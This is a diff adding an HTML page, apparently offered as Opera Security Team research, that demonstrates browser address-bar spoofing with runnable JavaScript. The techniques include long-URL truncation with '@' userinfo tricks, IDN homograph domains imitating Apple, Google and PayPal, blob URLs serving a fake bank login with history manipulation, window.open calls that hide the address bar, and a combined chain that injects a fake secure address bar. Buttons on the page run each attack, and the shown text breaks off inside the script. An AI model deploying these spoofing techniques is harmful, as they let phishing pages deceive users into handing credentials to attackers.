@@ -1,0 +1,1377 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Opera Security Team: Advanced URL Spoofing Techniques 2025</title>
+    <style>
+        :root {
+            --opera-red: #ff1b2d;
+            --opera-dark: #1a1a2e;
+            --opera-light: #f8f9fa;
+            --hacker-green: #00ff00;
+            --warning: #ff6b35;
+            --success: #00d4aa;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Operator Mono', 'Fira Code', monospace;
+            background: var(--opera-dark);
+            color: var(--opera-light);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .header {
+            text-align: center;
+            padding: 40px 20px;
+            border-bottom: 2px solid var(--opera-red);
+            margin-bottom: 40px;
+            position: relative;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        }
+        
+        .opera-badge {
+            background: var(--opera-red);
+            color: white;
+            padding: 8px 20px;
+            border-radius: 20px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        
+        .terminal-warning {
+            background: rgba(255, 107, 53, 0.1);
+            border: 1px solid var(--warning);
+            padding: 25px;
+            margin: 30px 0;
+            border-radius: 10px;
+            font-family: monospace;
+            font-size: 14px;
+            line-height: 1.8;
+        }
+        
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(600px, 1fr));
+            gap: 25px;
+            margin: 30px 0;
+        }
+        
+        .technique-card {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 15px;
+            padding: 25px;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .technique-card:hover {
+            border-color: var(--opera-red);
+            box-shadow: 0 0 30px rgba(255, 27, 45, 0.2);
+            transform: translateY(-5px);
+        }
+        
+        .technique-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--opera-red), var(--success));
+        }
+        
+        .technique-title {
+            color: var(--opera-red);
+            margin-bottom: 15px;
+            font-size: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .browser-badges {
+            display: flex;
+            gap: 10px;
+            margin: 15px 0;
+            flex-wrap: wrap;
+        }
+        
+        .browser-badge {
+            padding: 5px 15px;
+            border-radius: 15px;
+            font-size: 12px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        
+        .badge-opera { background: var(--opera-red); color: white; }
+        .badge-chrome { background: #1a73e8; color: white; }
+        .badge-firefox { background: #ff9500; color: white; }
+        .badge-safari { background: #06c; color: white; }
+        .badge-edge { background: #0078d4; color: white; }
+        
+        .code-block {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 20px;
+            border-radius: 10px;
+            font-family: 'Fira Code', monospace;
+            font-size: 13px;
+            overflow-x: auto;
+            margin: 20px 0;
+            border-left: 4px solid var(--hacker-green);
+            line-height: 1.4;
+        }
+        
+        .string { color: #98c379; }
+        .keyword { color: #c678dd; }
+        .function { color: #61afef; }
+        .comment { color: #5c6370; font-style: italic; }
+        .variable { color: #e06c75; }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-family: inherit;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-primary {
+            background: var(--opera-red);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #ff0015;
+            transform: scale(1.05);
+        }
+        
+        .btn-success {
+            background: var(--success);
+            color: white;
+        }
+        
+        .btn-warning {
+            background: var(--warning);
+            color: white;
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 2px solid var(--opera-red);
+            color: var(--opera-red);
+        }
+        
+        .url-display {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            word-break: break-all;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .demo-frame {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: white;
+            border-radius: 15px;
+            z-index: 9999;
+            display: none;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            min-width: 500px;
+            max-width: 90vw;
+        }
+        
+        .demo-header {
+            background: #f8f9fa;
+            padding: 15px;
+            border-bottom: 1px solid #dee2e6;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .demo-url-bar {
+            flex: 1;
+            background: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            border: 1px solid #ced4da;
+            margin: 0 15px;
+            font-family: monospace;
+            font-size: 14px;
+            color: #212529;
+            overflow: hidden;
+            white-space: nowrap;
+        }
+        
+        .demo-content {
+            padding: 30px;
+            color: #212529;
+            max-height: 70vh;
+            overflow-y: auto;
+        }
+        
+        .close-btn {
+            background: var(--opera-red);
+            color: white;
+            border: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .result-panel {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 400px;
+            max-height: 500px;
+            background: rgba(26, 26, 46, 0.95);
+            border: 1px solid var(--opera-red);
+            border-radius: 10px;
+            padding: 20px;
+            z-index: 1000;
+            display: none;
+            overflow-y: auto;
+            backdrop-filter: blur(10px);
+        }
+        
+        .result-item {
+            padding: 10px;
+            margin: 5px 0;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 5px;
+            font-size: 12px;
+            border-left: 3px solid var(--hacker-green);
+        }
+        
+        .result-item.error {
+            border-left-color: var(--opera-red);
+        }
+        
+        .result-item.warning {
+            border-left-color: var(--warning);
+        }
+        
+        .controls {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            gap: 10px;
+            z-index: 1001;
+        }
+        
+        .info-box {
+            background: rgba(0, 212, 170, 0.1);
+            border: 1px solid var(--success);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        
+        @media (max-width: 768px) {
+            .technique-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .result-panel {
+                width: 90%;
+                right: 5%;
+            }
+            
+            .demo-frame {
+                min-width: 90%;
+            }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="opera-badge">
+                <i class="fas fa-shield-alt"></i> OPERA SECURITY TEAM RESEARCH
+            </div>
+            <h1>Advanced Address Bar Spoofing Techniques 2025-2026</h1>
+            <p>Long URL exploitation and domain masking bypass techniques for modern browsers</p>
+            
+            <div class="terminal-warning">
+                <i class="fas fa-exclamation-triangle"></i>
+                <strong>RESEARCH PURPOSES ONLY</strong><br>
+                Techniques based on Opera Security Team findings. Test only on systems you own.<br>
+                Modern browsers have protections - these demonstrate potential bypass vectors.
+            </div>
+        </div>
+        
+        <!-- Controls -->
+        <div class="controls">
+            <button class="btn btn-primary" onclick="toggleResults()">
+                <i class="fas fa-terminal"></i> Console
+            </button>
+            <button class="btn btn-warning" onclick="clearAll()">
+                <i class="fas fa-trash"></i> Clear
+            </button>
+        </div>
+        
+        <!-- Technique 1: Long URL Truncation -->
+        <div class="technique-grid">
+            <div class="technique-card">
+                <div class="technique-title">
+                    <i class="fas fa-link"></i> TECHNIQUE 1: Long URL Truncation Exploit
+                </div>
+                
+                <div class="browser-badges">
+                    <span class="browser-badge badge-opera">Opera</span>
+                    <span class="browser-badge badge-chrome">Chrome</span>
+                    <span class="browser-badge badge-edge">Edge</span>
+                </div>
+                
+                <div class="info-box">
+                    <strong>Opera Security Finding:</strong> URLs longer than address bar width get truncated, hiding the actual domain.
+                </div>
+                
+                <div class="code-block">
+<span class="comment">// Create extremely long URL with malicious domain hidden</span>
+<span class="keyword">function</span> <span class="function">createLongURLSpoof</span>() {
+    <span class="keyword">const</span> <span class="variable">legitPart</span> = <span class="string">'https://www.legitimate-site.com/very-long-path/'</span>;
+    <span class="keyword">const</span> <span class="variable">padding</span> = <span class="string">'a/'</span>.<span class="function">repeat</span>(<span class="variable">200</span>); <span class="comment">// Creates 200 directory levels</span>
+    <span class="keyword">const</span> <span class="variable">maliciousDomain</span> = <span class="string">'@malicious-phishing-site.com'</span>;
+    
+    <span class="keyword">const</span> <span class="variable">spoofedURL</span> = <span class="variable">legitPart</span> + <span class="variable">padding</span> + <span class="variable">maliciousDomain</span>;
+    
+    <span class="comment">// Open window with spoofed URL</span>
+    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="variable">spoofedURL</span>, <span class="string">'_blank'</span>);
+    
+    <span class="keyword">return</span> <span class="variable">win</span>;
+}
+
+<span class="comment">// Advanced: Combine with userinfo syntax</span>
+<span class="keyword">function</span> <span class="function">advancedURLObfuscation</span>() {
+    <span class="keyword">const</span> <span class="variable">url</span> = <span class="string">'https://'</span> + 
+                <span class="string">'legituser:password@'</span> +
+                <span class="string">'www.trusted-site.com'</span> +
+                <span class="string">'/very/deep/path/'</span> +
+                <span class="string">'@actual-malicious-domain.com'</span> +
+                <span class="string">'/?redirect='</span> + <span class="function">encodeURIComponent</span>(<span class="string">'https://phishing.com'</span>);
+    
+    <span class="function">log</span>(<span class="string">'Advanced URL: '</span> + <span class="variable">url</span>.<span class="function">substring</span>(<span class="variable">0</span>, <span class="variable">100</span>) + <span class="string">'...'</span>);
+    <span class="function">window</span>.<span class="function">open</span>(<span class="variable">url</span>, <span class="string">'_blank'</span>);
+}</div>
+                
+                <div class="url-display" id="longUrlExample">
+                    Generating example URL...
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeLongURL()">
+                        <i class="fas fa-play"></i> Execute Long URL Spoof
+                    </button>
+                    <button class="btn btn-success" onclick="showLongURLDemo()">
+                        <i class="fas fa-eye"></i> Show Demo
+                    </button>
+                    <button class="btn btn-outline" onclick="generateAdvancedURL()">
+                        <i class="fas fa-bolt"></i> Generate Advanced URL
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Technique 2: IDN Homograph Attack 2025 -->
+            <div class="technique-card">
+                <div class="technique-title">
+                    <i class="fas fa-globe"></i> TECHNIQUE 2: IDN Homograph Attacks 2025
+                </div>
+                
+                <div class="browser-badges">
+                    <span class="browser-badge badge-opera">Opera</span>
+                    <span class="browser-badge badge-chrome">Chrome</span>
+                    <span class="browser-badge badge-firefox">Firefox</span>
+                </div>
+                
+                <div class="code-block">
+<span class="comment">// IDN (Internationalized Domain Names) Homograph Attack</span>
+<span class="keyword">function</span> <span class="function">createIDNSpoof</span>() {
+    <span class="comment">// Cyrillic 'a' (U+0430) looks like Latin 'a' (U+0061)</span>
+    <span class="keyword">const</span> <span class="variable">cyrillicA</span> = <span class="string">'\u0430'</span>; <span class="comment">// а</span>
+    <span class="keyword">const</span> <span class="variable">latinA</span> = <span class="string">'a'</span>; <span class="comment">// a</span>
+    
+    <span class="comment">// Create domain that looks like "apple.com"</span>
+    <span class="keyword">const</span> <span class="variable">fakeApple</span> = <span class="string">'https://'</span> + 
+                      <span class="variable">cyrillicA</span> + <span class="string">'pple'</span> + 
+                      <span class="string">'.com'</span>;
+    
+    <span class="comment">// Greek omicron (U+03BF) looks like Latin 'o'</span>
+    <span class="keyword">const</span> <span class="variable">greekO</span> = <span class="string">'\u03BF'</span>; <span class="comment">// ο</span>
+    <span class="keyword">const</span> <span class="variable">fakeGoogle</span> = <span class="string">'https://g'</span> + <span class="variable">greekO</span> + <span class="string">'οgle.com'</span>;
+    
+    <span class="comment">// Zero-width characters for extra deception</span>
+    <span class="keyword">const</span> <span class="variable">zwSpace</span> = <span class="string">'\u200B'</span>; <span class="comment">// Zero-width space</span>
+    <span class="keyword">const</span> <span class="variable">zwJoin</span> = <span class="string">'\u200D'</span>; <span class="comment">// Zero-width joiner</span>
+    
+    <span class="keyword">const</span> <span class="variable">advancedSpoof</span> = <span class="string">'https://pay'</span> + <span class="variable">zwSpace</span> + <span class="string">'pal'</span> + <span class="variable">zwJoin</span> + <span class="string">'.com'</span>;
+    
+    <span class="function">log</span>(<span class="string">'Fake Apple: '</span> + <span class="variable">fakeApple</span>);
+    <span class="function">log</span>(<span class="string">'Fake Google: '</span> + <span class="variable">fakeGoogle</span>);
+    <span class="function">log</span>(<span class="string">'Advanced Spoof: '</span> + <span class="variable">advancedSpoof</span>);
+    
+    <span class="comment">// Try to open (modern browsers show punycode)</span>
+    <span class="function">window</span>.<span class="function">open</span>(<span class="variable">fakeApple</span>, <span class="string">'_blank'</span>);
+}</div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeIDNSpoof()">
+                        <i class="fas fa-language"></i> Execute IDN Attack
+                    </button>
+                    <button class="btn btn-warning" onclick="testIDNProtection()">
+                        <i class="fas fa-shield-alt"></i> Test Browser Protection
+                    </button>
+                    <button class="btn btn-outline" onclick="generateHomographURLs()">
+                        <i class="fas fa-random"></i> Generate Homographs
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Technique 3: Blob + History State Manipulation -->
+        <div class="technique-grid">
+            <div class="technique-card">
+                <div class="technique-title">
+                    <i class="fas fa-history"></i> TECHNIQUE 3: Blob + History State Bypass
+                </div>
+                
+                <div class="browser-badges">
+                    <span class="browser-badge badge-opera">Opera</span>
+                    <span class="browser-badge badge-chrome">Chrome</span>
+                </div>
+                
+                <div class="code-block">
+<span class="comment">// Advanced: Blob URL with history manipulation</span>
+<span class="keyword">async</span> <span class="keyword">function</span> <span class="function">blobHistoryBypass</span>() {
+    <span class="comment">// Create blob with malicious content</span>
+    <span class="keyword">const</span> <span class="variable">maliciousContent</span> = <span class="string">`</span>
+<span class="string">        &lt;!DOCTYPE html&gt;</span>
+<span class="string">        &lt;html&gt;</span>
+<span class="string">        &lt;head&gt;</span>
+<span class="string">            &lt;title&gt;Secure Banking Login&lt;/title&gt;</span>
+<span class="string">            &lt;script&gt;</span>
+<span class="string">                // Try to manipulate history state</span>
+<span class="string">                window.onload = function() {</span>
+<span class="string">                    try {</span>
+<span class="string">                        // Push fake URL to history</span>
+<span class="string">                        history.replaceState({}, '', '/secure-login');</span>
+<span class="string">                        </span>
+<span class="string">                        // Complex: Nested blobs</span>
+<span class="string">                        setTimeout(() => {</span>
+<span class="string">                            const blob = new Blob(['</span>
+<span class="string">                                &lt;h1&gt;Redirecting...&lt;/h1&gt;</span>
+<span class="string">                            '], {type: 'text/html'});</span>
+<span class="string">                            window.location.href = URL.createObjectURL(blob);</span>
+<span class="string">                        }, 3000);</span>
+<span class="string">                    } catch(e) {</span>
+<span class="string">                        console.log('History manipulation blocked');</span>
+<span class="string">                    }</span>
+<span class="string">                };</span>
+<span class="string">            &lt;/script&gt;</span>
+<span class="string">        &lt;/head&gt;</span>
+<span class="string">        &lt;body&gt;</span>
+<span class="string">            &lt;h1&gt;Your Bank - Secure Login&lt;/h1&gt;</span>
+<span class="string">            &lt;p&gt;Blob URL with history manipulation&lt;/p&gt;</span>
+<span class="string">        &lt;/body&gt;</span>
+<span class="string">        &lt;/html&gt;</span>
+<span class="string">    `</span>;
+    
+    <span class="keyword">const</span> <span class="variable">blob</span> = <span class="keyword">new</span> <span class="function">Blob</span>([<span class="variable">maliciousContent</span>], {<span class="variable">type</span>: <span class="string">'text/html'</span>});
+    <span class="keyword">const</span> <span class="variable">blobUrl</span> = <span class="function">URL</span>.<span class="function">createObjectURL</span>(<span class="variable">blob</span>);
+    
+    <span class="comment">// Open with specific features</span>
+    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(
+        <span class="variable">blobUrl</span>,
+        <span class="string">'_blank'</span>,
+        <span class="string">'width=800,height=600,location=yes,menubar=no,toolbar=no'</span>
+    );
+    
+    <span class="comment">// Cleanup after 10 seconds</span>
+    <span class="function">setTimeout</span>(() => <span class="function">URL</span>.<span class="function">revokeObjectURL</span>(<span class="variable">blobUrl</span>), <span class="variable">10000</span>);
+    
+    <span class="keyword">return</span> <span class="variable">win</span>;
+}
+
+<span class="comment">// Chain multiple blobs</span>
+<span class="keyword">function</span> <span class="function">blobChainAttack</span>() {
+    <span class="keyword">const</span> <span class="variable">blob1</span> = <span class="keyword">new</span> <span class="function">Blob</span>([<span class="string">'&lt;h1&gt;Stage 1&lt;/h1&gt;&lt;script&gt;setTimeout(() => parent.nextStage(), 2000)&lt;/script&gt;'</span>], 
+        {<span class="variable">type</span>: <span class="string">'text/html'</span>});
+    
+    <span class="keyword">const</span> <span class="variable">blob2</span> = <span class="keyword">new</span> <span class="function">Blob</span>([<span class="string">'&lt;h1&gt;Stage 2 - Malicious&lt;/h1&gt;'</span>], 
+        {<span class="variable">type</span>: <span class="string">'text/html'</span>});
+    
+    <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="function">URL</span>.<span class="function">createObjectURL</span>(<span class="variable">blob1</span>), <span class="string">'_blank'</span>);
+    
+    <span class="function">window</span>.<span class="variable">nextStage</span> = () => {
+        <span class="variable">win</span>.<span class="variable">location</span>.<span class="variable">href</span> = <span class="function">URL</span>.<span class="function">createObjectURL</span>(<span class="variable">blob2</span>);
+    };
+}</div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeBlobHistory()">
+                        <i class="fas fa-code-branch"></i> Execute Blob+History
+                    </button>
+                    <button class="btn btn-success" onclick="createBlobChain()">
+                        <i class="fas fa-link"></i> Create Blob Chain
+                    </button>
+                    <button class="btn btn-outline" onclick="testBlobDetection()">
+                        <i class="fas fa-search"></i> Test Detection
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Technique 4: Window.open Feature Abuse -->
+            <div class="technique-card">
+                <div class="technique-title">
+                    <i class="fas fa-window-maximize"></i> TECHNIQUE 4: Window Feature Manipulation 2025
+                </div>
+                
+                <div class="browser-badges">
+                    <span class="browser-badge badge-opera">Opera</span>
+                    <span class="browser-badge badge-chrome">Chrome</span>
+                </div>
+                
+                <div class="code-block">
+<span class="comment">// Advanced window.open feature exploitation</span>
+<span class="keyword">function</span> <span class="function">windowFeatureExploit</span>() {
+    <span class="comment">// Feature combinations that might bypass security</span>
+    <span class="keyword">const</span> <span class="variable">featureSets</span> = [
+        {
+            <span class="variable">name</span>: <span class="string">'Hidden Address Bar'</span>,
+            <span class="variable">features</span>: <span class="string">'width=800,height=600,location=0,toolbar=0,menubar=0,scrollbars=1'</span>
+        },
+        {
+            <span class="variable">name</span>: <span class="string">'Popup Style'</span>,
+            <span class="variable">features</span>: <span class="string">'width=400,height=300,left=100,top=100,resizable=0,status=0'</span>
+        },
+        {
+            <span class="variable">name</span>: <span class="string">'Fullscreen-like'</span>,
+            <span class="variable">features</span>: <span class="string">`width=${screen.width},height=${screen.height},fullscreen=yes`</span>
+        },
+        {
+            <span class="variable">name</span>: <span class="string">'Dialog Style'</span>,
+            <span class="variable">features</span>: <span class="string">'dialog=yes,modal=yes,centerscreen=yes'</span>
+        }
+    ];
+    
+    <span class="comment">// Test each feature set</span>
+    <span class="variable">featureSets</span>.<span class="function">forEach</span>((<span class="variable">set</span>, <span class="variable">index</span>) => {
+        <span class="function">setTimeout</span>(() => {
+            <span class="function">log</span>(<span class="string">`Testing: </span>${<span class="variable">set</span>.<span class="variable">name</span>}<span class="string">`</span>);
+            
+            <span class="keyword">try</span> {
+                <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(
+                    <span class="string">'about:blank'</span>,
+                    <span class="string">`test-</span>${<span class="variable">index</span>}<span class="string">`</span>,
+                    <span class="variable">set</span>.<span class="variable">features</span>
+                );
+                
+                <span class="keyword">if</span> (<span class="variable">win</span>) {
+                    <span class="variable">win</span>.<span class="variable">document</span>.<span class="variable">body</span>.<span class="variable">innerHTML</span> = <span class="string">`</span>
+<span class="string">                        &lt;h1&gt;</span>${<span class="variable">set</span>.<span class="variable">name</span>}<span class="string">&lt;/h1&gt;</span>
+<span class="string">                        &lt;p&gt;Features: </span>${<span class="variable">set</span>.<span class="variable">features</span>}<span class="string">&lt;/p&gt;</span>
+<span class="string">                        &lt;p&gt;Check address bar visibility&lt;/p&gt;</span>
+<span class="string">                    `</span>;
+                }
+            } <span class="keyword">catch</span> (<span class="variable">e</span>) {
+                <span class="function">log</span>(<span class="string">`Error with </span>${<span class="variable">set</span>.<span class="variable">name</span>}<span class="string">: </span>${<span class="variable">e</span>.<span class="variable">message</span>}<span class="string">`</span>, <span class="string">'error'</span>);
+            }
+        }, <span class="variable">index</span> * <span class="variable">2000</span>);
+    });
+}
+
+<span class="comment">// Feature testing for specific browsers</span>
+<span class="keyword">function</span> <span class="function">testBrowserSpecificFeatures</span>() {
+    <span class="keyword">const</span> <span class="variable">browserTests</span> = {
+        <span class="variable">chrome</span>: <span class="string">'chrome=no,chrome=yes'</span>,
+        <span class="variable">opera</span>: <span class="string">'opera=no'</span>,
+        <span class="variable">edge</span>: <span class="string">'edge=no'</span>
+    };
+    
+    <span class="keyword">for</span> (<span class="keyword">const</span> [<span class="variable">browser</span>, <span class="variable">features</span>] <span class="keyword">of</span> <span class="function">Object</span>.<span class="function">entries</span>(<span class="variable">browserTests</span>)) {
+        <span class="keyword">try</span> {
+            <span class="keyword">const</span> <span class="variable">win</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="string">'about:blank'</span>, <span class="string">`</span>${<span class="variable">browser</span>}<span class="string">-test`</span>, <span class="variable">features</span>);
+            <span class="keyword">if</span> (<span class="variable">win</span>) {
+                <span class="function">log</span>(<span class="string">`</span>${<span class="variable">browser</span>}<span class="string"> features: </span>${<span class="variable">features</span>}<span class="string">`</span>);
+            }
+        } <span class="keyword">catch</span> (<span class="variable">e</span>) {
+            <span class="function">log</span>(<span class="string">`</span>${<span class="variable">browser</span>}<span class="string"> feature test failed`</span>, <span class="string">'error'</span>);
+        }
+    }
+}</div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeWindowFeatures()">
+                        <i class="fas fa-cogs"></i> Test Window Features
+                    </button>
+                    <button class="btn btn-warning" onclick="testSpecificFeatures()">
+                        <i class="fas fa-vial"></i> Browser-Specific Tests
+                    </button>
+                    <button class="btn btn-outline" onclick="bypassFeatureRestrictions()">
+                        <i class="fas fa-unlock"></i> Bypass Restrictions
+                    </button>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Technique 5: Advanced Combined Attack -->
+        <div class="technique-grid">
+            <div class="technique-card">
+                <div class="technique-title">
+                    <i class="fas fa-bomb"></i> TECHNIQUE 5: Combined Advanced Attack 2026
+                </div>
+                
+                <div class="browser-badges">
+                    <span class="browser-badge badge-opera">Opera</span>
+                    <span class="browser-badge badge-chrome">Chrome</span>
+                    <span class="browser-badge badge-firefox">Firefox</span>
+                </div>
+                
+                <div class="code-block">
+<span class="comment">// Ultimate combined attack using all techniques</span>
+<span class="keyword">async</span> <span class="keyword">function</span> <span class="function">advancedCombinedAttack</span>() {
+    <span class="function">log</span>(<span class="string">'🚀 Starting advanced combined attack...'</span>, <span class="string">'warning'</span>);
+    
+    <span class="comment">// Phase 1: Long URL with IDN</span>
+    <span class="keyword">const</span> <span class="variable">phase1URL</span> = <span class="function">createAdvancedSpoofURL</span>();
+    <span class="keyword">const</span> <span class="variable">win1</span> = <span class="function">window</span>.<span class="function">open</span>(<span class="variable">phase1URL</span>, <span class="string">'_blank'</span>);
+    
+    <span class="function">setTimeout</span>(() => {
+        <span class="comment">// Phase 2: Blob chain inside opened window</span>
+        <span class="keyword">if</span> (<span class="variable">win1</span> && !<span class="variable">win1</span>.<span class="variable">closed</span>) {
+            <span class="keyword">const</span> <span class="variable">blob</span> = <span class="keyword">new</span> <span class="function">Blob</span>([<span class="string">'&lt;h1&gt;Phase 2: Blob Content&lt;/h1&gt;'</span>], 
+                {<span class="variable">type</span>: <span class="string">'text/html'</span>});
+            <span class="variable">win1</span>.<span class="variable">location</span>.<span class="variable">href</span> = <span class="function">URL</span>.<span class="function">createObjectURL</span>(<span class="variable">blob</span>);
+        }
+        
+        <span class="function">setTimeout</span>(() => {
+            <span class="comment">// Phase 3: iframe injection on main page</span>
+            <span class="keyword">const</span> <span class="variable">iframe</span> = <span class="variable">document</span>.<span class="function">createElement</span>(<span class="string">'iframe'</span>);
+            <span class="variable">iframe</span>.<span class="variable">srcdoc</span> = <span class="string">`</span>
+<span class="string">                &lt;style&gt;.fake-bar { background: #f1f3f4; padding: 10px; }&lt;/style&gt;</span>
+<span class="string">                &lt;div class="fake-bar"&gt;🔒 https://secure-combined-attack.com&lt;/div&gt;</span>
+<span class="string">                &lt;h1&gt;Combined Attack Demo&lt;/h1&gt;</span>
+<span class="string">            `</span>;
+            <span class="variable">iframe</span>.<span class="variable">style</span>.<span class="variable">cssText</span> = <span class="string">`</span>
+<span class="string">                position: fixed; bottom: 20px; right: 20px;</span>
+<span class="string">                width: 400px; height: 300px; border: 2px solid red;</span>
+<span class="string">                z-index: 9999; background: white;</span>
+<span class="string">            `</span>;
+            <span class="variable">document</span>.<span class="variable">body</span>.<span class="function">appendChild</span>(<span class="variable">iframe</span>);
+            
+            <span class="function">setTimeout</span>(() => {
+                <span class="comment">// Phase 4: Final payload</span>
+                <span class="function">alert</span>(<span class="string">'Advanced Combined Attack Complete\n\nDemonstration of multiple techniques.'</span>);
+                <span class="function">log</span>(<span class="string">'✅ Combined attack completed'</span>, <span class="string">'success'</span>);
+            }, <span class="variable">2000</span>);
+        }, <span class="variable">2000</span>);
+    }, <span class="variable">1000</span>);
+}
+
+<span class="keyword">function</span> <span class="function">createAdvancedSpoofURL</span>() {
+    <span class="comment">// Combines long URL, IDN, and special characters</span>
+    <span class="keyword">const</span> <span class="variable">idnDomain</span> = <span class="string">'\u0430pple.com'</span>; <span class="comment">// Cyrillic 'a'</span>
+    <span class="keyword">const</span> <span class="variable">longPath</span> = <span class="string">'/very/'</span> + <span class="string">'long/'</span>.<span class="function">repeat</span>(<span class="variable">50</span>) + <span class="string">'path/'</span>;
+    <span class="keyword">const</span> <span class="variable">hiddenMalicious</span> = <span class="string">'@actual-phishing-site.com'</span>;
+    <span class="keyword">const</span> <span class="variable">params</span> = <span class="string">'?ref='</span> + <span class="function">encodeURIComponent</span>(<span class="string">'https://legit-site.com'</span>);
+    
+    <span class="keyword">return</span> <span class="string">'https://'</span> + <span class="variable">idnDomain</span> + <span class="variable">longPath</span> + <span class="variable">hiddenMalicious</span> + <span class="variable">params</span>;
+}</div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" onclick="executeCombinedAttack()">
+                        <i class="fas fa-rocket"></i> Execute Combined Attack
+                    </button>
+                    <button class="btn btn-warning" onclick="testAllProtections()">
+                        <i class="fas fa-shield-alt"></i> Test Protections
+                    </button>
+                    <button class="btn btn-outline" onclick="generateSecurityReport()">
+                        <i class="fas fa-file-alt"></i> Generate Report
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Demo Frame -->
+    <div class="demo-frame" id="demoFrame">
+        <div class="demo-header">
+            <div style="color: green;">🔒</div>
+            <div class="demo-url-bar" id="demoUrlBar">https://secure-demo.com</div>
+            <button class="close-btn" onclick="closeDemo()">×</button>
+        </div>
+        <div class="demo-content" id="demoContent">
+            Demo content will appear here
+        </div>
+    </div>
+    
+    <!-- Result Panel -->
+    <div class="result-panel" id="resultPanel">
+        <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
+            <h4><i class="fas fa-terminal"></i> Security Test Console</h4>
+            <button class="btn" style="padding: 5px 10px; font-size: 12px;" onclick="clearConsole()">
+                Clear
+            </button>
+        </div>
+        <div id="consoleOutput"></div>
+    </div>
+    
+    <script>
+        // Global state
+        let activeWindows = [];
+        let activeIframes = [];
+        let consoleVisible = false;
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            // Generate initial long URL example
+            updateLongURLExample();
+            
+            // Log initialization
+            log('System initialized', 'info');
+            log('Browser: ' + navigator.userAgent, 'info');
+            log('Ready for Opera Security Team testing', 'success');
+            
+            // Auto-show console
+            setTimeout(() => toggleResults(), 1000);
+        });
+        
+        // Logging system
+        function log(message, type = 'info') {
+            const consoleOutput = document.getElementById('consoleOutput');
+            const timestamp = new Date().toLocaleTimeString();
+            const entry = document.createElement('div');
+            entry.className = 'result-item ' + (type === 'error' ? 'error' : type === 'warning' ? 'warning' : '');
+            entry.innerHTML = `<strong>[${timestamp}]</strong> ${message}`;
+            
+            consoleOutput.appendChild(entry);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+            
+            // Also log to browser console
+            const consoleMethods = {
+                'success': console.log,
+                'error': console.error,
+                'warning': console.warn,
+                'info': console.info
+            };
+            (consoleMethods[type] || console.log)(`[${type}] ${message}`);
+        }
+        
+        // Toggle results panel
+        function toggleResults() {
+            const panel = document.getElementById('resultPanel');
+            panel.style.display = consoleVisible ? 'none' : 'block';
+            consoleVisible = !consoleVisible;
+        }
+        
+        // Clear console
+        function clearConsole() {
